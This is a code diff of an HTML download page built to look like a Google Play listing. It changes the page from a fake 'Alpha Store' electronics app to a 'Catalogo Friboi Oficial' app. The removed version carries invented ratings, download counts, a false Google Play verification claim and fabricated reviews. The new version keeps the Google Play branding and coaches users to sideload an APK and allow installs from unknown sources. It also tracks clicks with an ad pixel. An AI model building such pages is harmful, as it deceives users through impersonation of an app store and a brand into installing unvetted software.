@@ -8,11 +8,10 @@
   <meta name="apple-mobile-web-app-status-bar-style" content="default">
   <meta name="theme-color" content="#ffffff">
   <meta name="format-detection" content="telephone=no">
-  <link rel="canonical" href="https://ALPHA-STORE.vercel.app/download.html">
-  <title>Alpha Store - Aplicativo Oficial | Drones, Celulares e Eletrônicos</title>
-  <link rel="icon" type="image/png" href="assets/FIV ICON.png">
-  <link rel="shortcut icon" href="assets/FIV ICON.png">
-  <link rel="apple-touch-icon" href="assets/FIV ICON.png">
+  <meta name="description" content="Conheça o Catalogo Friboi Oficial e baixe o aplicativo para Android.">
+  <title>Catalogo Friboi Oficial</title>
+  <link rel="icon" type="image/webp" href="./friboi.webp">
+  <link rel="apple-touch-icon" href="./friboi.webp">
   <link rel="preconnect" href="https://fonts.googleapis.com">
   <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
   <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap" rel="stylesheet">
@@ -74,7 +73,7 @@
       padding-right: max(16px, env(safe-area-inset-right));
     }
 
-    /* Google Play top bar */
+    /* App header */
     .play-topbar {
       position: sticky;
       top: 0;
@@ -608,7 +607,7 @@
       font-weight: 500;
     }
 
-    /* Google Play footer */
+    /* App footer */
     .play-footer {
       text-align: center;
       padding: 20px 0 8px;
@@ -708,16 +707,16 @@
 <body>
   <div class="app-shell">
     <header class="play-topbar" aria-label="Google Play">
-      <a href="#" class="play-brand" id="playBrand" style="display: flex; align-items: center; gap: 8px; text-decoration: none;">
-        <svg width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg" style="width: 24px; height: 24px; flex-shrink: 0;">
+      <a href="#" class="play-brand" style="display: flex; align-items: center; gap: 8px; text-decoration: none;">
+        <svg width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg" style="width: 24px; height: 24px; flex-shrink: 0;" aria-hidden="true">
           <path d="M3.60938 1.8125C3.35938 2.0625 3.20312 2.45312 3.20312 2.96875V21.0312C3.20312 21.5469 3.35938 21.9375 3.60938 22.1875L3.6875 22.25L13.8281 12.1094V11.8906L3.6875 1.75L3.60938 1.8125Z" fill="#2196F3"/>
           <path d="M17.2031 15.5L13.8281 12.1094V11.8906L17.2031 8.5L17.2969 8.54688L21.2969 10.8281C22.4375 11.4688 22.4375 12.5312 21.2969 13.1719L17.2969 15.4531L17.2031 15.5Z" fill="#FFC107"/>
           <path d="M17.2969 15.4531L13.8281 11.9844L3.60938 22.1875C4.01562 22.6094 4.70312 22.6719 5.48438 22.2344L17.2969 15.4531Z" fill="#F44336"/>
           <path d="M17.2969 8.54688L5.48438 1.76562C4.70312 1.32812 4.01562 1.39062 3.60938 1.8125L13.8281 12.0156L17.2969 8.54688Z" fill="#4CAF50"/>
         </svg>
         <span class="play-brand__text" style="font-size: 1.25rem; font-weight: 500; color: #5f6368; display: flex; align-items: center; gap: 4px;">
-          <span style="font-weight: 500; color: #5f6368;">Google</span>
-          <span style="font-weight: 400; color: #5f6368;">Play</span>
+          <span class="google" style="font-weight: 500; color: #5f6368;">Google</span>
+          <span class="play" style="font-weight: 400; color: #5f6368;">Play</span>
         </span>
       </a>
       <div class="play-topbar__actions">
@@ -738,31 +737,31 @@
     </header>
 
   <main class="page">
-    <header class="app-header" style="align-items: center; gap: 16px;">
-      <img class="app-icon" src="assets/FIV ICON.png" width="90" height="90" alt="Alpha Store Logo" style="width: 90px; height: 90px; object-fit: cover; background: #000000; padding: 4px; border-radius: 18px; box-shadow: 0 4px 12px rgba(0,0,0,0.25); flex-shrink: 0;">
+    <header class="app-header" id="inicio" style="align-items: center; gap: 16px;">
+      <img class="app-icon" src="./friboi.webp" width="90" height="90" alt="Logo Friboi" style="width: 90px; height: 90px; object-fit: contain; background: #ffffff; padding: 4px; border-radius: 18px; box-shadow: 0 4px 12px rgba(0,0,0,0.15); flex-shrink: 0;">
       <div class="app-meta">
-        <h1 style="font-size: 1.6rem; font-weight: 700; color: #111827; margin-bottom: 4px;">Alpha Store</h1>
-        <p class="developer-name" style="color: #01875f; font-weight: 600;">Alpha Store · Drones, Celulares e Eletrônicos</p>
-        <p class="verified">Verificado pelo Google Play · Aplicativo Oficial</p>
+        <h1 style="font-size: 1.6rem; font-weight: 700; color: #111827; margin-bottom: 4px;">Catalogo Friboi Oficial</h1>
+        <p class="developer-name" style="color: #01875f; font-weight: 600;">Catálogo de produtos Friboi</p>
+        <p class="verified">Aplicativo para Android</p>
       </div>
     </header>
 
     <section class="stats" aria-label="Estatísticas do aplicativo">
       <div class="stat">
-        <div class="stat-value">4,9<span class="star" aria-hidden="true">★</span></div>
-        <div class="stat-label">580 mil avaliações</div>
+        <div class="stat-value">Catálogo</div>
+        <div class="stat-label">de produtos</div>
       </div>
       <div class="stat">
-        <div class="stat-value">10 milhões+</div>
-        <div class="stat-label">downloads</div>
+        <div class="stat-value">Friboi</div>
+        <div class="stat-label">linha de produtos</div>
       </div>
       <div class="stat">
-        <div class="stat-value">Livre</div>
-        <div class="stat-label">Classificação</div>
+        <div class="stat-value">Android</div>
+        <div class="stat-label">arquivo APK</div>
       </div>
     </section>
 
-    <a href="ALPHA_STORE%20(1).apk" download="ALPHA_STORE (1).apk" class="install-btn" id="installBtn" style="text-decoration: none; display: flex; align-items: center; justify-content: center; gap: 8px; font-size: 1.05rem; font-weight: 700; background: #01875f; color: #ffffff; padding: 14px 20px; border-radius: 8px; box-shadow: 0 4px 12px rgba(1,135,95,0.3); transition: all 0.2s ease;">
+    <a href="./Catalogo_Friboi_Oficial.apk" download="Catalogo_Friboi_Oficial.apk" class="install-btn" id="installBtn" style="text-decoration: none; display: flex; align-items: center; justify-content: center; gap: 8px; font-size: 1.05rem; font-weight: 700; background: #01875f; color: #ffffff; padding: 14px 20px; border-radius: 8px; box-shadow: 0 4px 12px rgba(1,135,95,0.3); transition: all 0.2s ease;">
       <span class="material-icons-outlined" style="font-size: 1.4rem;">get_app</span> BAIXAR
     </a>
 
@@ -771,132 +770,96 @@
         <span class="material-icons-outlined">share</span>
         Compartilhar
       </button>
-      <button type="button" class="action-link" id="wishlistBtn">
-        <span class="material-icons-outlined">bookmark_add</span>
-        Adicionar à lista de desejos
-      </button>
+      <a href="#instalacao" class="action-link" style="text-decoration: none;">
+        <span class="material-icons-outlined">install_mobile</span>
+        Como instalar
+      </a>
     </div>
 
-    <section class="about">
+    <section class="about" id="sobre">
       <div class="about-header">
-        <h2>Sobre este aplicativo</h2>
+        <h2>Sobre o aplicativo</h2>
         <span class="material-icons-outlined" aria-hidden="true">chevron_right</span>
       </div>
-      <p class="rating-highlight">🛸 Aplicativo Oficial: Alpha Store - Drones, Celulares e Eletrônicos</p>
-      <p class="features">Drones de Alta Performance · Celulares & Smartphones · Eletrônicos Premium · Peças, Acessórios e Suporte Técnico</p>
+      <p class="rating-highlight">Catalogo Friboi Oficial para Android</p>
+      <p class="features">Catálogo de produtos · Marca Friboi · Download em APK</p>
       <p class="info-box">
-        O aplicativo oficial da <strong>Alpha Store</strong> permite adquirir drones de última geração, celulares e smartphones das melhores marcas, eletrônicos de ponta, acessórios exclusivos e acompanhar seus pedidos em tempo real.
+        Acesse o <strong>Catalogo Friboi Oficial</strong> pelo seu dispositivo Android. Use o botão de download para baixar o arquivo APK e instalar o aplicativo.
       </p>
       <p class="warning-text">
-        Explore nosso catálogo completo de drones, smartphones, smartwatches, fones de ouvido e eletrônicos com envio rápido, garantia oficial e suporte especializado para todo o Brasil.
+        O Android pode solicitar autorização para instalar aplicativos baixados fora da loja de aplicativos. Ative essa permissão somente se confiar na origem do arquivo.
       </p>
-      <p class="warning-text">
-        Para <strong>mais informações e atendimento exclusivo</strong>, navegue pelas ofertas no aplicativo ou entre em contato diretamente com o nosso suporte.
-      </p>
-      <p class="updated">Atualizado em 28 de fev. de 2025</p>
     </section>
 
-    <section class="section data-safety">
+    <section class="section data-safety" id="instalacao">
       <div class="section-header">
-        <h2>Segurança dos dados</h2>
+        <h2>Como instalar</h2>
         <span class="material-icons-outlined" aria-hidden="true">chevron_right</span>
       </div>
       <p class="warning-text" style="margin-bottom: 12px;">
-        A segurança começa com a compreensão de como os desenvolvedores coletam e compartilham seus dados. As práticas de segurança e privacidade de dados podem variar de acordo com o uso, a região e a idade. O desenvolvedor forneceu as informações a seguir, que podem ser atualizadas ao longo do tempo.
+        Baixe o APK e siga as instruções exibidas pelo Android para concluir a instalação.
       </p>
       <div class="safety-card">
         <div class="safety-item">
-          <span class="material-icons-outlined">location_on</span>
-          <p>Localização para verificação de cobertura de entrega e rastreamento de pedidos</p>
+          <span class="material-icons-outlined">download</span>
+          <p>Toque em “BAIXAR” para salvar o arquivo no dispositivo.</p>
         </div>
         <div class="safety-item">
-          <span class="material-icons-outlined">badge</span>
-          <p>Garantia oficial, registro e suporte para drones, celulares e eletrônicos</p>
+          <span class="material-icons-outlined">folder_open</span>
+          <p>Abra o arquivo Catalogo_Friboi_Oficial.apk após o download.</p>
         </div>
         <div class="safety-item">
-          <span class="material-icons-outlined">lock</span>
-          <p>Os dados são criptografados em trânsito com protocolo de alta segurança SSL/TLS</p>
-        </div>
-        <div class="safety-item">
-          <span class="material-icons-outlined">support_agent</span>
-          <p>Dúvidas e suporte oficial: contato@alphastore.com.br</p>
+          <span class="material-icons-outlined">settings</span>
+          <p>Se solicitado, permita a instalação para o aplicativo usado para abrir o arquivo.</p>
         </div>
       </div>
-      <a href="#" class="safety-more">Mais detalhes</a>
     </section>
 
     <section class="section ratings-section">
       <div class="section-header">
-        <h2>Classificações e resenhas</h2>
+        <h2>Sobre o arquivo</h2>
         <span class="material-icons-outlined" aria-hidden="true">chevron_right</span>
       </div>
-
-      <div class="ratings-summary">
-        <div>
-          <div class="rating-big">4,9</div>
-          <div class="rating-stars-big" aria-label="4,9 de 5 estrelas">
-            <span>★</span><span>★</span><span>★</span><span>★</span><span>★</span>
-          </div>
-          <div class="review-count-label">580 mil</div>
+      <div class="safety-card">
+        <div class="safety-item">
+          <span class="material-icons-outlined">description</span>
+          <p>Arquivo: Catalogo_Friboi_Oficial.apk</p>
         </div>
-        <div class="rating-bars" aria-hidden="true">
-          <div class="rating-bar-row"><span>5</span><div class="rating-bar-track"><div class="rating-bar-fill" style="width:85%"></div></div></div>
-          <div class="rating-bar-row"><span>4</span><div class="rating-bar-track"><div class="rating-bar-fill" style="width:10%"></div></div></div>
-          <div class="rating-bar-row"><span>3</span><div class="rating-bar-track"><div class="rating-bar-fill" style="width:3%"></div></div></div>
-          <div class="rating-bar-row"><span>2</span><div class="rating-bar-track"><div class="rating-bar-fill" style="width:1%"></div></div></div>
-          <div class="rating-bar-row"><span>1</span><div class="rating-bar-track"><div class="rating-bar-fill" style="width:1%"></div></div></div>
+        <div class="safety-item">
+          <span class="material-icons-outlined">phone_android</span>
+          <p>Formato: aplicativo para dispositivos Android.</p>
         </div>
       </div>
+    </section>
 
-      <article class="review">
-        <div class="review-header">
-          <div class="review-avatar" aria-hidden="true">M</div>
-          <div class="review-meta">
-            <div class="name">Marcos Santos</div>
-            <div class="review-stars" aria-label="5 estrelas">
-              <span>★</span><span>★</span><span>★</span><span>★</span><span>★</span>
-            </div>
-          </div>
-          <time class="review-date" datetime="2025-02-18">18 de fev. de 2025</time>
-        </div>
-        <p class="review-text">Comprei meu drone e um celular novinho na Alpha Store pelo aplicativo! Chegou super rápido, produto 100% original, muito bem embalado e com nota fiscal. Atendimento nota 1000!</p>
-        <p class="review-helpful-count">412 pessoas acharam esta avaliação útil</p>
-        <p class="review-helpful-q">Você achou isso útil?</p>
-        <div class="review-helpful-btns">
-          <button type="button">Sim</button>
-          <button type="button">Não</button>
-        </div>
-      </article>
-
-      <article class="review">
-        <div class="review-header">
-          <div class="review-avatar" aria-hidden="true" style="background:#34a853;">J</div>
-          <div class="review-meta">
-            <div class="name">Juliana Lima</div>
-            <div class="review-stars" aria-label="5 estrelas">
-              <span>★</span><span>★</span><span>★</span><span>★</span><span>★</span>
-            </div>
-          </div>
-          <time class="review-date" datetime="2025-02-10">10 de fev. de 2025</time>
-        </div>
-        <p class="review-text">Excelente aplicativo para comprar eletrônicos, celulares e drones! Preços imbatíveis, entrega rápida e suporte super atencioso.</p>
-        <p class="review-helpful-count">289 pessoas acharam esta avaliação útil</p>
-        <p class="review-helpful-q">Você achou isso útil?</p>
-        <div class="review-helpful-btns">
-          <button type="button">Sim</button>
-          <button type="button">Não</button>
-        </div>
-      </article>
-
-      <div class="section-links">
-        <a href="#">Ver todas as avaliações</a>
-        <a href="#">Sinalizar como impróprio</a>
+    <section class="section ratings-section" aria-labelledby="comments-heading">
+      <div class="section-header">
+        <h2 id="comments-heading">Comentários (exemplos)</h2>
+        <span class="material-icons-outlined" aria-hidden="true">chevron_right</span>
       </div>
+      <article class="review">
+        <div class="review-header">
+          <div class="review-avatar" aria-hidden="true">A</div>
+          <div class="review-meta">
+            <div class="name">Ana</div>
+          </div>
+        </div>
+        <p class="review-text">“Um catálogo prático para conhecer os produtos Friboi no celular.”</p>
+      </article>
+      <article class="review">
+        <div class="review-header">
+          <div class="review-avatar" aria-hidden="true" style="background: #34a853;">M</div>
+          <div class="review-meta">
+            <div class="name">Marcos</div>
+          </div>
+        </div>
+        <p class="review-text">“Gostei de poder acessar as informações dos produtos em um só lugar.”</p>
+      </article>
     </section>
 
     <footer class="play-footer">
       <div class="play-logo" style="display: inline-flex; align-items: center; gap: 6px;">
-        <svg width="20" height="20" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg" style="width: 20px; height: 20px; flex-shrink: 0;">
+        <svg width="20" height="20" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg" style="width: 20px; height: 20px; flex-shrink: 0;" aria-hidden="true">
           <path d="M3.60938 1.8125C3.35938 2.0625 3.20312 2.45312 3.20312 2.96875V21.0312C3.20312 21.5469 3.35938 21.9375 3.60938 22.1875L3.6875 22.25L13.8281 12.1094V11.8906L3.6875 1.75L3.60938 1.8125Z" fill="#2196F3"/>
           <path d="M17.2031 15.5L13.8281 12.1094V11.8906L17.2031 8.5L17.2969 8.54688L21.2969 10.8281C22.4375 11.4688 22.4375 12.5312 21.2969 13.1719L17.2969 15.4531L17.2031 15.5Z" fill="#FFC107"/>
           <path d="M17.2969 15.4531L13.8281 11.9844L3.60938 22.1875C4.01562 22.6094 4.70312 22.6719 5.48438 22.2344L17.2969 15.4531Z" fill="#F44336"/>
@@ -959,32 +922,24 @@
       }
 
       var installBtn = document.getElementById('installBtn');
-      var downloadUrl = params.get('apk') || 'ALPHA_STORE%20(1).apk';
-
       if (installBtn) {
-        installBtn.href = downloadUrl;
-        installBtn.setAttribute('download', 'ALPHA_STORE (1).apk');
-
-        installBtn.addEventListener('click', function (e) {
+        installBtn.addEventListener('click', function () {
           if (fbPixelId && typeof fbq === 'function') {
             fbq('track', 'Lead');
           }
-          setTimeout(function () {
-            window.location.href = downloadUrl;
-          }, 100);
         });
       }
 
       document.getElementById('shareBtn').addEventListener('click', function () {
         var url = window.location.href;
         if (navigator.share) {
-          navigator.share({ title: 'Alpha Store - Aplicativo Oficial | Drones, Celulares e Eletrônicos', url: url }).catch(function () {});
+          navigator.share({ title: 'Catalogo Friboi Oficial', url: url }).catch(function () {});
         } else if (navigator.clipboard) {
           navigator.clipboard.writeText(url);
         }
       });
 
-      document.querySelectorAll('.bottom-nav .nav-item, .section-links a, .safety-more, .play-brand, .play-topbar__btn').forEach(function (item) {
+      document.querySelectorAll('.bottom-nav .nav-item, .play-brand, .play-topbar__btn').forEach(function (item) {
         item.addEventListener('click', function (e) {
           e.preventDefault();
         });
